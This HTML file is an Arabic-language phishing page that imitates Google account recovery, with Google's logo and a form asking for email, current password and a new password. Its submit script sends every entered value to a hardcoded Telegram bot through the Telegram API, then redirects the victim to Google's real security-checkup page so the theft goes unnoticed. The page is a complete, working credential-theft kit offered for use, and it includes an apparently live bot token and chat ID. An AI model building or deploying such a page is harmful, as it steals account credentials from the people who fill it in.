<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>استعادة حساب Google</title>
  <style>
    body {
      background: #f2f2f2;
      font-family: 'Arial', sans-serif;
    }

    .container {
      background: white;
      width: 360px;
      margin: 100px auto;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: right;
    }

    .container img {
      display: block;
      margin: 0 auto 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 12px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      direction: ltr;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #1a73e8;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
    <h2>استعادة الحساب</h2>
    <form id="recoveryForm">
      <label>البريد الإلكتروني</label>
      <input type="email" name="email" required>

      <label>كلمة المرور الحالية</label>
      <input type="password" name="current" required>

      <label>كلمة المرور الجديدة</label>
      <input type="password" name="new" required>

      <label>تأكيد كلمة المرور الجديدة</label>
      <input type="password" name="confirm" required>

      <button type="submit">متابعة</button>
    </form>
  </div>

  <script>
    document.getElementById('recoveryForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const email = this.email.value;
      const current = this.current.value;
      const newPass = this.new.value;
      const confirm = this.confirm.value;

      const token = '7974833718:AAEkJZ66-Sz_m8uP663whBH2yTmktnCGmP4'; // حط التوكن هنا
      const chat_id = '6817512459'; // حط ال chat ID هنا
      const text = `
محاولة استعادة حساب Google:
البريد الإلكتروني: ${email}
كلمة المرور الحالية: ${current}
كلمة المرور الجديدة: ${newPass}
تأكيد كلمة المرور: ${confirm}
      `;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: text
        })
      }).then(() => {
        window.location.href = 'https://myaccount.google.com/security-checkup';
      });
    });
  </script>
</body>
</html>
